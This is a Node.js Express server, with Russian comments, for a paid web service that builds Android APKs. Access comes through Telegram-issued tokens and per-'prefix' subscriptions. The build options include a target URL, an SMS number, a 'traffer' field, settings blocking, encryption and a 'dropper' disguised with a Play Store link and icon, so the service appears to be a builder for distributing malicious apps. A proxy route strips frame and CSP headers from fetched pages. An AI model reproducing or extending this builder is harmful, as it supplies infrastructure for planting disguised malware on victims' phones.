'use strict';
require('dotenv').config();
const express      = require('express');
const http         = require('http');
const https        = require('https');
const zlib         = require('zlib');
const { Server }   = require('socket.io');
const path         = require('path');
const fs           = require('fs');
const crypto       = require('crypto');
const multer       = require('multer');
const cookieParser = require('cookie-parser');
const { PROJECTS, DEPENDENCIES } = require('./buildUtils');
const { runBuild, cleanup, OUTPUT_APK_DIR } = require('./buildRunner');
const queue        = require('./buildQueue');
const { WbSession, WbBuildHistory, WbTemplate, WbUser } = require('./db');
const panelApi     = require('./panelApiCache');
const { validateAndActivateToken } = require('./auth');

const logger = {
  _fmt: (lvl, msg) => '[' + new Date().toISOString() + '] [' + lvl + '] ' + msg,
  info:  msg => console.log(logger._fmt('INFO',  msg)),
  warn:  msg => console.warn(logger._fmt('WARN',  msg)),
  error: msg => console.error(logger._fmt('ERROR', msg)),
};

function genId() {
  try { return crypto.randomUUID(); }
  catch (_) { return Date.now().toString(36) + Math.random().toString(36).slice(2); }
}

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });
const iconStorage = multer.diskStorage({
  destination: UPLOADS_DIR,
  filename: (_req, _file, cb) => cb(null, `icon_${genId()}.png`),
});
const iconUpload = multer({
  storage: iconStorage,
  limits: { fileSize: 10 * 1024 * 1024 },
  fileFilter: (_req, file, cb) => {
    if (file.mimetype.startsWith('image/')) cb(null, true);
    else cb(new Error('Only images allowed'));
  },
});

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, { cors: { origin: 'https://fantasy-hub.xyz' } });
const PORT   = process.env.PORT || 8888;

app.use(express.json({ limit: '1mb' }));
app.use(cookieParser());
// static без index: false — index.html управляем вручную
app.use(express.static(path.join(__dirname, 'public'), { index: false }));

// ──────────────────────────────────────────────
// MIDDLEWARE
// ──────────────────────────────────────────────

async function requireSession(req, res, next) {
  const sid = req.cookies && req.cookies.wbsession;
  if (!sid) return res.status(401).json({ error: 'no_session' });
  const session = await WbSession.findOne({ sessionId: sid }).lean();
  if (!session || session.expiresAt < new Date())
    return res.status(401).json({ error: 'expired' });
  req.wbSession = session;
  next();
}

function requireInternal(req, res, next) {
  const fromLocal = ['127.0.0.1', '::1', '::ffff:127.0.0.1'].includes(req.ip);
  if (!fromLocal || req.headers['x-internal-token'] !== process.env.INTERNAL_TOKEN)
    return res.status(403).end();
  next();
}

// Socket.io auth
function parseCookieHeader(header) {
  const cookies = {};
  (header || '').split(';').forEach(c => {
    const [k, ...v] = c.split('=');
    cookies[k.trim()] = v.join('=').trim();
  });
  return cookies;
}

io.use(async (socket, next) => {
  const cookies = parseCookieHeader(socket.handshake.headers.cookie);
  const sid = cookies['wbsession'];
  if (!sid) return next(new Error('no_session'));
  const session = await WbSession.findOne({ sessionId: sid }).lean();
  if (!session || session.expiresAt < new Date()) return next(new Error('expired'));
  socket.data.session = session;
  next();
});

// ──────────────────────────────────────────────
// ПОДПИСКА — ПРОВЕРКИ
// ──────────────────────────────────────────────

async function checkSubscriptionByTelegramId(telegram_id) {
  const botUser = await WbUser.findOne({ telegram_id }).lean();
  if (!botUser) return false;
  if (botUser.is_admin) return true;
  if (!botUser.is_allowed) return false;
  if (!botUser.subscription_expires_at) return false;
  if (new Date(botUser.subscription_expires_at) < new Date()) return false;
  return true;
}

async function checkSubscriptionByPrefix(login) {
  const user = await panelApi.panelAdminGetUserByLogin(login);
  if (!user) return false;
  if (user.subscriptionFrozen) return false;
  if (!user.subscriptionExpiresAt || new Date(user.subscriptionExpiresAt) < new Date()) return false;
  return true;
}

// ──────────────────────────────────────────────
// ROUTES — PUBLIC
// ──────────────────────────────────────────────

// GET / — выдаём index.html только с сессией
app.get('/', async (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  const sid = req.cookies && req.cookies.wbsession;
  if (!sid) return res.sendFile(path.join(__dirname, 'public', '404fun.html'));
  const session = await WbSession.findOne({ sessionId: sid }).lean();
  if (!session || session.expiresAt < new Date())
    return res.sendFile(path.join(__dirname, 'public', '404fun.html'));
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// GET /api/activate — активация ссылки
app.get('/api/activate', async (req, res) => {
  const raw = req.query.t;
  const clientIp = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.ip;
  console.log(`[ACTIVATE] t=${raw ? raw.substring(0,16)+'...' : 'null'} ip=${clientIp}`);
  if (!raw) return res.sendFile(path.join(__dirname, 'public', '404fun.html'));

  const result = await validateAndActivateToken(raw);
  console.log(`[ACTIVATE] validateResult=${JSON.stringify(result)}`);
  if (!result.ok) {
    const msgs = {
      not_found:   'Ссылка недействительна',
      revoked:     'Ссылка была отозвана',
      already_used:'Ссылка уже использована',
      expired:     'Срок действия ссылки истёк',
    };
    const msg = msgs[result.reason] || 'Ссылка недействительна';
    return res.status(403).send(`<html><body style="background:#0f1117;color:#e2e8f0;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0"><div style="text-align:center"><div style="font-size:60px">⛔</div><h2>${msg}</h2></div></body></html>`);
  }

  const { telegram_id } = result;

  // Проверка подписки в bot-MongoDB
  const subOk = await checkSubscriptionByTelegramId(telegram_id);
  console.log(`[ACTIVATE] telegram_id=${telegram_id} checkSub=${subOk}`);
  if (!subOk) {
    return res.status(403).send(`<html><body style="background:#0f1117;color:#e2e8f0;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0"><div style="text-align:center"><div style="font-size:60px">⏰</div><h2>Подписка истекла или недоступна</h2></div></body></html>`);
  }

  // Создаём сессию
  const sessionId = crypto.randomUUID();
  const sessionTtl = 24 * 60 * 60 * 1000; // 24 часа
  const expiresAt = new Date(Date.now() + sessionTtl);
  const sessionMode = (req.query.mode === 'template') ? 'template' : 'build';
  await WbSession.create({ sessionId, telegram_id, expiresAt, activeBuildId: null, mode: sessionMode });

  console.log(`[ACTIVATE] SUCCESS telegram_id=${telegram_id} sessionId=${sessionId}`);
  res.cookie('wbsession', sessionId, {
    httpOnly: true,
    secure:   true,
    sameSite: 'Lax',
    expires:  expiresAt,
  });
  res.redirect('/');
});

// ──────────────────────────────────────────────
// ROUTES — PROTECTED
// ──────────────────────────────────────────────

app.get('/api/projects', requireSession, (_req, res) => {
  const out = {};
  Object.entries(PROJECTS).forEach(([k, p]) => {
    out[k] = { label: p.label, isLite: p.isLite, features: p.features };
  });
  res.json(out);
});
app.get('/api/dependencies', requireSession, (_req, res) => res.json(DEPENDENCIES));
app.get('/api/queue',        requireSession, (_req, res) => res.json(queue.status()));
app.get('/api/session-info', requireSession, (req, res) => {
  res.json({ telegram_id: req.wbSession.telegram_id, mode: req.wbSession.mode || 'build' });
});

// GET /api/me — статус текущей сборки
app.get('/api/me', requireSession, async (req, res) => {
  const { telegram_id } = req.wbSession;
  let activeBuildId = req.wbSession.activeBuildId;
  if (!activeBuildId) {
    const running = await WbBuildHistory.findOne({ telegram_id, status: 'running' }).lean();
    activeBuildId = running ? running.buildId : null;
  }

  let buildStatus = null, downloadToken = null;
  if (activeBuildId) {
    const result  = global._buildResults && global._buildResults[activeBuildId];
    const history = await WbBuildHistory.findOne({ buildId: activeBuildId }).lean();
    if (result && result.apkPath) {
      buildStatus   = 'ready';
      downloadToken = result.downloadToken;
    } else if (history && history.apkPath && fs.existsSync(history.apkPath)) {
      buildStatus   = 'ready';
      downloadToken = history.downloadToken;
    } else if (history && history.status === 'running') {
      buildStatus = 'running';
    } else {
      buildStatus = 'failed';
    }
  }
  res.json({ telegram_id, activeBuildId, buildStatus, downloadToken });
});

// activeBuilds Map — ключ по prefix
const activeBuilds = new Map();

// POST /api/build
app.post('/api/build', requireSession, async (req, res) => {
  const { telegram_id } = req.wbSession;
  const prefix = String(req.body.prefix || '').trim();

  if (!/^\d{6}$/.test(prefix))
    return res.status(400).json({ error: 'invalid_prefix' });

  if (!await checkSubscriptionByTelegramId(telegram_id)) {
    await WbSession.deleteOne({ sessionId: req.wbSession.sessionId });
    return res.status(403).json({ error: 'your_subscription_invalid' });
  }

  if (!await checkSubscriptionByPrefix(prefix))
    return res.status(403).json({ error: 'prefix_subscription_invalid' });

  if (activeBuilds.has(prefix))
    return res.status(409).json({ error: 'build_in_progress' });

  if (!PROJECTS[req.body.project])
    return res.status(400).json({ error: 'unknown_project' });

  const id = genId();
  activeBuilds.set(prefix, id);
  await WbSession.updateOne({ sessionId: req.wbSession.sessionId }, { $set: { activeBuildId: id } });

  // Лимит истории: удалить самую старую если > 20
  const cnt = await WbBuildHistory.countDocuments({ telegram_id });
  if (cnt >= 20) {
    const oldest = await WbBuildHistory.findOne({ telegram_id }).sort({ createdAt: 1 }).lean();
    if (oldest) await WbBuildHistory.deleteOne({ _id: oldest._id });
  }

  await WbBuildHistory.create({
    telegram_id, prefix, buildId: id,
    params: Object.assign({}, req.body, { prefix: undefined }),
    status: 'running', createdAt: new Date()
  });
  res.json({ id });

  const iconPath = req.body.iconId
    ? path.join(UPLOADS_DIR, req.body.iconId + '.png')
    : null;
  const dropperIconPath = req.body.dropperIconId
    ? path.join(UPLOADS_DIR, req.body.dropperIconId + '.png')
    : null;

  const buildParams = {
    project:              req.body.project,
    appName:              req.body.appName        || 'Application',
    prefix,
    targetUrl:            req.body.targetUrl      || '',
    smsNumber:            req.body.smsNumber      || '',
    traffer:              req.body.traffer        || '',
    launcherType:         req.body.launcherType   || 'LEANBACK',
    settingsBlockEnabled: req.body.settingsBlockEnabled !== false,
    features:             req.body.features       || {},
    iconPath,
    useDropper:           !!req.body.useDropper,
    dropperType:          req.body.dropperType    || 'wombat',
    dropperAppName:       req.body.dropperAppName || '',
    dropperUrl:           req.body.dropperUrl     || 'https://play.google.com/store',
    dropperStoreIcon:     req.body.dropperStoreIcon || 'google',
    encryptionMode:       req.body.encryptionMode || 'no',
    dropperIconPath,
  };

  const logBuffer = [];
  global._buildLogs = global._buildLogs || {};
  global._buildLogs[id] = logBuffer;

  let timeoutId;
  const timeoutPromise = new Promise((_, reject) => {
    timeoutId = setTimeout(() => reject(new Error('build_timeout')), 15 * 60 * 1000);
  });

  queue.enqueue({
    id,
    project: buildParams.project,
    runner: () => Promise.race([
      runBuild(id, buildParams, {
        onLine: line => {
          logBuffer.push(line);
          io.to(`build:${id}`).emit('log', { id, line });
        },
        onProgress: pct => {
          io.to(`build:${id}`).emit('progress', { id, pct });
        },
      }),
      timeoutPromise
    ]).then(async ({ apkPath, filename }) => {
      const downloadToken = crypto.randomBytes(16).toString('hex');
      const downloadExpires = new Date(Date.now() + 30 * 60 * 1000);
      global._buildResults = global._buildResults || {};
      global._buildResults[id] = { apkPath, filename, downloadToken };
      setTimeout(() => {
        if (global._buildResults && global._buildResults[id]) {
          fs.unlink(apkPath, () => {});
          delete global._buildResults[id];
        }
        delete global._buildLogs[id];
        cleanup(id).catch(() => {});
      }, 30 * 60 * 1000);
      // Сохраняем иконку в history_icons до удаления
      let iconHistRef = null;
      if (iconPath && req.body.iconId) {
        try {
          const hDir = path.join(__dirname, 'history_icons', String(telegram_id));
          await fs.promises.mkdir(hDir, { recursive: true });
          iconHistRef = req.body.iconId + '.png';
          await fs.promises.copyFile(iconPath, path.join(hDir, iconHistRef));
        } catch (_) { iconHistRef = null; }
      }
      if (iconPath && iconPath !== dropperIconPath) fs.unlink(iconPath, () => {});
      if (dropperIconPath) fs.unlink(dropperIconPath, () => {});
      await WbBuildHistory.updateOne({ buildId: id }, {
        $set: { status: 'success', apkPath, filename, downloadToken, downloadExpires, finishedAt: new Date(), ...(iconHistRef ? { 'params.iconHistoryRef': iconHistRef } : {}) }
      });
      try { const _lRec = await WbBuildHistory.findOne({buildId:id},{telegram_id:1}).lean(); if(_lRec&&_lRec.telegram_id){const _lEx=await WbBuildHistory.find({telegram_id:_lRec.telegram_id,status:'success'},{_id:1,apkPath:1}).sort({createdAt:-1}).skip(20).lean();for(const _lb of _lEx){if(_lb.apkPath)fs.unlink(_lb.apkPath,()=>{});await WbBuildHistory.deleteOne({_id:_lb._id}).catch(()=>{});}}} catch(_){}
      return { apkPath, filename };
    }).catch(async e => {
      if (iconPath) fs.unlink(iconPath, () => {});
      if (dropperIconPath) fs.unlink(dropperIconPath, () => {});
      await cleanup(id).catch(() => {});
      await WbBuildHistory.updateOne({ buildId: id }, { $set: { status: 'failed', finishedAt: new Date() } });
      throw e;
    }).finally(async () => {
      clearTimeout(timeoutId);
      activeBuilds.delete(prefix);
      await WbSession.updateOne({ sessionId: req.wbSession.sessionId }, { $set: { activeBuildId: null } });
    })
  });
});

// GET /api/apk/:id — скачать APK
app.get('/api/apk/:id', async (req, res) => {
  const dt = req.query.dt;
  let authorizedTelegramId;

  if (dt) {
    const history = await WbBuildHistory.findOne({
      buildId:        req.params.id,
      downloadToken:  dt,
      downloadExpires: { $gt: new Date() }
    }).lean();
    if (!history) return res.status(403).json({ error: 'invalid_download_token' });
    authorizedTelegramId = history.telegram_id;
  } else {
    const sid = req.cookies && req.cookies.wbsession;
    if (!sid) return res.status(401).end();
    const session = await WbSession.findOne({ sessionId: sid }).lean();
    if (!session || session.expiresAt < new Date()) return res.status(401).end();
    authorizedTelegramId = session.telegram_id;
  }

  const result = global._buildResults && global._buildResults[req.params.id];
  if (!result || !result.apkPath) return res.status(404).json({ error: 'not_ready' });
  if (!fs.existsSync(result.apkPath)) return res.status(404).json({ error: 'file_missing' });

  const history = await WbBuildHistory.findOne({ buildId: req.params.id, telegram_id: authorizedTelegramId }).lean();
  if (!history) return res.status(403).end();

  const apkPath = result.apkPath;
  const filename = result.filename || 'app.apk';
  delete global._buildResults[req.params.id];
  await WbBuildHistory.updateOne({ buildId: req.params.id }, { $set: { downloadToken: null } });

  res.download(apkPath, filename, (err) => { if (!err) fs.unlink(apkPath, () => {}); });
});

// GET /api/logs/:id
app.get('/api/logs/:id', requireSession, (req, res) => {
  const buf = global._buildLogs && global._buildLogs[req.params.id];
  res.json({ lines: buf || [] });
});

// GET /api/history
app.get('/api/history', requireSession, async (req, res) => {
  const { telegram_id } = req.wbSession;
  const history = await WbBuildHistory.find({ telegram_id }).sort({ createdAt: -1 }).limit(20).lean();
  res.json(history);
});

// /api/templates CRUD
app.get('/api/templates', requireSession, async (req, res) => {
  const { telegram_id } = req.wbSession;
  const templates = await WbTemplate.find({ telegram_id }).sort({ updatedAt: -1 }).lean();
  res.json(templates);
});

app.post('/api/templates', requireSession, async (req, res) => {
  const { telegram_id } = req.wbSession;
  const cnt = await WbTemplate.countDocuments({ telegram_id });
  if (cnt >= 10) return res.status(400).json({ error: 'template_limit_reached' });
  const templateId = genId();
  const tplParams = req.body.params || {};
  let iconRef = req.body.iconRef || null;
  if (!iconRef && tplParams.iconId) {
    const srcIcon = path.join(UPLOADS_DIR, tplParams.iconId + '.png');
    if (fs.existsSync(srcIcon)) {
      const destDir = path.join(__dirname, 'templates_icons', String(telegram_id));
      fs.mkdirSync(destDir, { recursive: true });
      iconRef = tplParams.iconId + '.png';
      fs.copyFileSync(srcIcon, path.join(destDir, iconRef));
    }
  }
  let dropperIconRef = req.body.dropperIconRef || null;
  if (!dropperIconRef && tplParams.dropperIconId) {
    const srcDrop = path.join(UPLOADS_DIR, tplParams.dropperIconId + '.png');
    if (fs.existsSync(srcDrop)) {
      const destDir2 = path.join(__dirname, 'templates_icons', String(telegram_id));
      fs.mkdirSync(destDir2, { recursive: true });
      dropperIconRef = tplParams.dropperIconId + '.png';
      fs.copyFileSync(srcDrop, path.join(destDir2, dropperIconRef));
    }
  }
  const tpl = await WbTemplate.create({
    telegram_id, templateId,
    name:           req.body.name   || 'Шаблон',
    prefix:         req.body.prefix || '',
    params:         tplParams,
    iconRef,
    dropperIconRef,
    createdAt: new Date(),
    updatedAt: new Date(),
  });
  res.json(tpl);
});

app.put('/api/templates/:id', requireSession, async (req, res) => {
  const { telegram_id } = req.wbSession;
  const tpl = await WbTemplate.findOneAndUpdate(
    { templateId: req.params.id, telegram_id },
    { $set: { name: req.body.name, prefix: req.body.prefix, params: req.body.params, iconRef: req.body.iconRef, updatedAt: new Date() } },
    { new: true }
  );
  if (!tpl) return res.status(404).json({ error: 'not_found' });
  res.json(tpl);
});

app.delete('/api/templates/:id', requireSession, async (req, res) => {
  const { telegram_id } = req.wbSession;
  const tpl = await WbTemplate.findOneAndDelete({ templateId: req.params.id, telegram_id });
  if (!tpl) return res.status(404).json({ error: 'not_found' });
  if (tpl.iconRef) {
    const iconPath = path.join(__dirname, 'templates_icons', String(telegram_id), tpl.iconRef);
    fs.unlink(iconPath, () => {});
  }
  res.json({ ok: true });
});

// GET /api/icon/:type/:ref
app.get('/api/icon/:type/:ref', requireSession, (req, res) => {
  const { type, ref } = req.params;
  if (!/^(?:icon_)?[a-f0-9-]{32,64}\.png$/.test(ref)) return res.status(400).end();
  if (!['history', 'template'].includes(type)) return res.status(400).end();
  const folder = type === 'history'
    ? `history_icons/${req.wbSession.telegram_id}`
    : `templates_icons/${req.wbSession.telegram_id}`;
  const base = path.resolve(__dirname, folder);
  const full = path.resolve(base, ref);
  if (!full.startsWith(base + path.sep)) return res.status(403).end();
  res.sendFile(full);
});

// SSRF proxy
function isProxyUrlSafe(raw) {
  let url;
  try { url = new URL(raw); } catch (_) { return false; }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return false;
  const h = url.hostname.toLowerCase().replace(/^\[|\]$/g, '');
  if (!h) return false;
  if (h === 'localhost' || h === '0.0.0.0' || h === '::1') return false;
  if (/^127\./.test(h) || /^10\./.test(h) || /^169\.254\./.test(h)) return false;
  if (/^192\.168\./.test(h)) return false;
  if (/^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(h)) return false;
  if (h.endsWith('.local') || h.endsWith('.localhost') || h.endsWith('.test') || h.endsWith('.internal')) return false;
  if (h === '169.254.169.254' || h === 'metadata.google.internal') return false;
  if (/^[0-9]+$/.test(h)) return false;
  if (h === '::') return false;
  if (/^fe80:/i.test(h)) return false;
  if (/^f[cd]/i.test(h)) return false;
  if (/^::ffff:/i.test(h)) {
    const v4 = h.replace(/^::ffff:/i, '');
    if (/^127\./.test(v4) || /^10\./.test(v4) || /^192\.168\./.test(v4)) return false;
    if (/^169\.254\./.test(v4) || /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(v4)) return false;
  }
  return true;
}
function proxyFetch(targetUrl, cb, hops) {
  if (hops > 6) return cb(new Error('Too many redirects'));
  let parsed;
  try { parsed = new URL(targetUrl); } catch (e) { return cb(e); }
  const proto = parsed.protocol === 'https:' ? https : http;
  const opts = {
    hostname: parsed.hostname,
    port: parsed.port || undefined,
    path: parsed.pathname + parsed.search,
    method: 'GET',
    headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br' },
    rejectUnauthorized: false,
  };
  let done = false;
  const once = (err, pRes, p) => { if (!done) { done = true; cb(err, pRes, p); } };
  const req = proto.request(opts, pRes => {
    if ([301,302,303,307,308].includes(pRes.statusCode) && pRes.headers.location) {
      const next = new URL(pRes.headers.location, targetUrl).href;
      pRes.resume();
      if (!isProxyUrlSafe(next)) return once(new Error('Redirect to forbidden url'));
      return proxyFetch(next, cb, hops + 1);
    }
    once(null, pRes, parsed);
  });
  req.on('error', err => once(err));
  req.setTimeout(25000, () => { req.destroy(); once(new Error('timeout')); });
  req.end();
}
const PROXY_PLACEHOLDER = `<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><style>*{margin:0;padding:0}body{background:#0f1117;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;color:#4a5568;font-size:13px;text-align:center;padding:20px}</style></head><body><p>Предпросмотр недоступен</p></body></html>`;

app.get('/api/proxy', requireSession, (req, res) => {
  let target = req.query.url || '';
  if (!target) return res.status(400).send('Missing url');
  try { new URL(target); } catch (_) { return res.status(400).send('Bad url'); }
  if (!isProxyUrlSafe(target)) { logger.warn('SSRF blocked: ' + target); return res.status(403).send('Forbidden url'); }
  proxyFetch(target, (err, pRes, parsed) => {
    if (err) {
      if (!res.headersSent) { res.setHeader('Content-Type', 'text/html; charset=utf-8'); return res.status(200).send(PROXY_PLACEHOLDER); }
      return;
    }
    const hdrs = {};
    for (const [k, v] of Object.entries(pRes.headers)) {
      const lk = k.toLowerCase();
      if (['x-frame-options','content-security-policy','content-security-policy-report-only','transfer-encoding'].includes(lk)) continue;
      hdrs[k] = v;
    }
    const chunks = [];
    pRes.on('data', c => chunks.push(c));
    pRes.on('end', () => {
      const raw = Buffer.concat(chunks);
      const enc = (pRes.headers['content-encoding'] || '').toLowerCase();
      const decompress = (buf, done) => {
        if (enc === 'gzip')    return zlib.gunzip(buf, done);
        if (enc === 'deflate') return zlib.inflate(buf, done);
        if (enc === 'br')      return zlib.brotliDecompress(buf, done);
        done(null, buf);
      };
      decompress(raw, (e2, body) => {
        if (e2) body = raw;
        let html = body.toString('utf8');
        const base = `<base href="${parsed.origin}/">`;
        if (!/<base/i.test(html)) html = html.replace(/(<head[^>]*>)/i, `$1${base}`);
        delete hdrs['content-encoding'];
        hdrs['content-length'] = Buffer.byteLength(html, 'utf8');
        if (!res.headersSent) { res.writeHead(pRes.statusCode || 200, hdrs); res.end(html); }
      });
    });
    pRes.on('error', () => { if (!res.headersSent) { res.setHeader('Content-Type', 'text/html; charset=utf-8'); res.status(200).send(PROXY_PLACEHOLDER); } });
  }, 0);
});

app.post('/api/upload/icon', requireSession, iconUpload.single('icon'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No icon file' });
  const iconId = req.file.filename.replace('.png', '');
  res.json({ iconId, filename: req.file.filename });
});

app.delete('/api/upload/icon/:iconId', requireSession, (req, res) => {
  const fp = path.join(UPLOADS_DIR, req.params.iconId + '.png');
  fs.unlink(fp, () => {});
  res.json({ ok: true });
});

// ──────────────────────────────────────────────
// INTERNAL API (бот → webbuilder)
// ──────────────────────────────────────────────

app.post('/api/internal/build', requireInternal, async (req, res) => {
  const { telegram_id, templateId } = req.body;
  if (!telegram_id || !templateId) return res.status(400).json({ error: 'missing_params' });

  const tpl = await WbTemplate.findOne({ templateId }).lean();
  if (!tpl) return res.status(404).json({ error: 'template_not_found' });

  if (!await checkSubscriptionByTelegramId(Number(telegram_id)))
    return res.status(403).json({ error: 'your_subscription_invalid' });

  const prefix = tpl.prefix || '';
  if (prefix && !await checkSubscriptionByPrefix(prefix))
    return res.status(403).json({ error: 'prefix_subscription_invalid' });

  if (activeBuilds.has(prefix)) return res.status(409).json({ error: 'build_in_progress' });

  const id = genId();
  if (prefix) activeBuilds.set(prefix, id);
  const cnt = await WbBuildHistory.countDocuments({ telegram_id: Number(telegram_id) });
  if (cnt >= 20) {
    const oldest = await WbBuildHistory.findOne({ telegram_id: Number(telegram_id) }).sort({ createdAt: 1 }).lean();
    if (oldest) await WbBuildHistory.deleteOne({ _id: oldest._id });
  }
  await WbBuildHistory.create({
    telegram_id: Number(telegram_id), prefix, buildId: id,
    params: tpl.params, status: 'running', createdAt: new Date()
  });

  const params = Object.assign({ prefix }, tpl.params || {});
  if (tpl.iconRef) {
    params.iconPath = path.join(__dirname, 'templates_icons', String(tpl.telegram_id), tpl.iconRef);
    delete params.iconId;
  } else if (params.iconId) {
    // Fallback: иконка ещё в uploads (шаблоны до нового патча)
    const fbIcon = path.join(UPLOADS_DIR, params.iconId + '.png');
    if (fs.existsSync(fbIcon)) params.iconPath = fbIcon;
    delete params.iconId;
  }
  if (tpl.dropperIconRef) {
    params.dropperIconPath = path.join(__dirname, 'templates_icons', String(tpl.telegram_id), tpl.dropperIconRef);
    delete params.dropperIconId;
  } else if (params.dropperIconId) {
    const fbDrop = path.join(UPLOADS_DIR, params.dropperIconId + '.png');
    if (fs.existsSync(fbDrop)) params.dropperIconPath = fbDrop;
    delete params.dropperIconId;
  }
  const logBuffer = [];
  global._buildLogs = global._buildLogs || {};
  global._buildLogs[id] = logBuffer;
  global._buildResults = global._buildResults || {};

  let timeoutId;
  const timeoutPromise = new Promise((_, reject) => {
    timeoutId = setTimeout(() => reject(new Error('build_timeout')), 15 * 60 * 1000);
  });

  queue.enqueue({
    id,
    project: params.project,
    runner: () => Promise.race([
      runBuild(id, params, { onLine: l => logBuffer.push(l), onProgress: () => {} }),
      timeoutPromise
    ]).then(async ({ apkPath, filename }) => {
      const downloadToken = crypto.randomBytes(16).toString('hex');
      const downloadExpires = new Date(Date.now() + 30 * 60 * 1000);
      global._buildResults[id] = { apkPath, filename, downloadToken };
      setTimeout(() => {
        if (global._buildResults[id]) { fs.unlink(apkPath, () => {}); delete global._buildResults[id]; }
        delete global._buildLogs[id];
        cleanup(id).catch(() => {});
      }, 30 * 60 * 1000);
      await WbBuildHistory.updateOne({ buildId: id }, {
        $set: { status: 'success', apkPath, filename, downloadToken, downloadExpires, finishedAt: new Date() }
      });
      try { const _lRec = await WbBuildHistory.findOne({buildId:id},{telegram_id:1}).lean(); if(_lRec&&_lRec.telegram_id){const _lEx=await WbBuildHistory.find({telegram_id:_lRec.telegram_id,status:'success'},{_id:1,apkPath:1}).sort({createdAt:-1}).skip(20).lean();for(const _lb of _lEx){if(_lb.apkPath)fs.unlink(_lb.apkPath,()=>{});await WbBuildHistory.deleteOne({_id:_lb._id}).catch(()=>{});}}} catch(_){}
      return { apkPath, filename };
    }).catch(async e => {
      await cleanup(id).catch(() => {});
      await WbBuildHistory.updateOne({ buildId: id }, { $set: { status: 'failed', finishedAt: new Date() } });
      throw e;
    }).finally(() => {
      clearTimeout(timeoutId);
      if (prefix) activeBuilds.delete(prefix);
    })
  });

  res.json({ id });
});

app.get('/api/internal/apk/:id', requireInternal, async (req, res) => {
  const history = await WbBuildHistory.findOne({ buildId: req.params.id }).lean();
  if (!history) return res.status(404).json({ status: 'not_found' });
  if (history.status === 'running') return res.status(202).json({ status: 'building' });
  if (history.status === 'failed')  return res.status(500).json({ status: 'failed', error: 'build_failed' });
  const memRes  = global._buildResults && global._buildResults[req.params.id];
  const apkPath  = (memRes && memRes.apkPath)  || history.apkPath;
  const filename = (memRes && memRes.filename) || history.filename || 'app.apk';
  if (!apkPath || !fs.existsSync(apkPath)) return res.status(404).json({ status: 'file_missing' });
  if (memRes) delete global._buildResults[req.params.id];
  await WbBuildHistory.updateOne({ buildId: req.params.id }, { $set: { downloadToken: null } });
  res.download(apkPath, filename, (err) => { if (!err) fs.unlink(apkPath, () => {}); });
});

app.get('/api/internal/build-status/:id', requireInternal, async (req, res) => {
  const history = await WbBuildHistory.findOne({ buildId: req.params.id }).lean();
  if (!history) return res.status(404).json({ status: 'not_found' });
  res.json({ status: history.status, buildId: req.params.id, filename: history.filename || null });
});

app.get('/api/build-history', requireSession, async (req, res) => {
  const prefix = req.query.prefix;
  if (!prefix || !/^\d{6}$/.test(prefix)) return res.json([]);
  try {
    const history = await WbBuildHistory.find(
      { telegram_id: req.wbSession.telegram_id, prefix: prefix, status: 'success' },
      { buildId: 1, status: 1, filename: 1, params: 1, createdAt: 1 }
    ).sort({ createdAt: -1 }).limit(10).lean();
    res.json(history);
  } catch(e) { res.json([]); }
});

// ──────────────────────────────────────────────
// SOCKET.IO
// ──────────────────────────────────────────────

io.on('connection', socket => {
  socket.on('subscribe', ({ id }) => {
    socket.join(`build:${id}`);
    const buf = global._buildLogs && global._buildLogs[id];
    if (buf && buf.length) buf.forEach(line => socket.emit('log', { id, line }));
  });
  socket.on('queue:status', () => socket.emit('queue:status', queue.status()));
});

queue.on('queued',   data => io.emit('queue:queued',   data));
queue.on('started',  data => io.emit('queue:started',  data));
queue.on('finished', data => {
  logger.info('Build finished id=' + data.id + ' ok=' + data.ok);
  io.emit('queue:finished', data);
  io.to(`build:${data.id}`).emit('finished', data);
});

// ──────────────────────────────────────────────
// СТАРТ
// ──────────────────────────────────────────────

(async () => {
  try {
    // running → failed после PM2 restart
    const { WbBuildHistory: WbBH } = require('./db');
    await WbBH.updateMany({ status: 'running' }, { $set: { status: 'failed', finishedAt: new Date() } });
  } catch (e) { /* DB может ещё не подключиться — не критично */ }

  // Удалить APK старше 30 минут из output_apks/
  try {
    const MAX_AGE = 30 * 60 * 1000;
    const now = Date.now();
    const files = fs.readdirSync(OUTPUT_APK_DIR).catch ? [] : fs.readdirSync(OUTPUT_APK_DIR);
    for (const f of files) {
      const fp = path.join(OUTPUT_APK_DIR, f);
      try { if (now - fs.statSync(fp).mtimeMs > MAX_AGE) fs.unlink(fp, () => {}); } catch(_) {}
    }
  } catch (_) {}

  await panelApi.init().catch(e => console.error('[server] panelApi init error:', e.message));
})();

server.listen(PORT, '127.0.0.1', () => {
  logger.info('Server started on port ' + PORT);
});
